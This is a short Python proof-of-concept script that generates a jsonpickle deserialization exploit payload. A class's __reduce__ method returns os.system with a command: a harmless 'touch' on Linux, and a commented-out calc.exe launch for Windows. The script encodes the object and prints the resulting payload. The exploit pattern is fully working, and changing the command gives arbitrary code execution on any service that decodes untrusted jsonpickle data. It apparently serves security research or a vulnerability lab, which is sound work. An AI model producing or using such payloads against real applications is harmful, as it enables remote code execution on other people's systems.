#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import subprocess

import jsonpickle


class Exp:
    def __reduce__(self):
        # windows poc
        # return os.system, ("calc.exe",)
        # Linux poc
        return os.system, ("touch /tmp/jsonpickle_deserialization",)
        # subprocess 的 poc 生成有问题，正确的poc参照vuln中。
        # return subprocess.Popen, (["touch", "/tmp/jsonpickle_deserialization"])


s = jsonpickle.encode(Exp())
print(s)
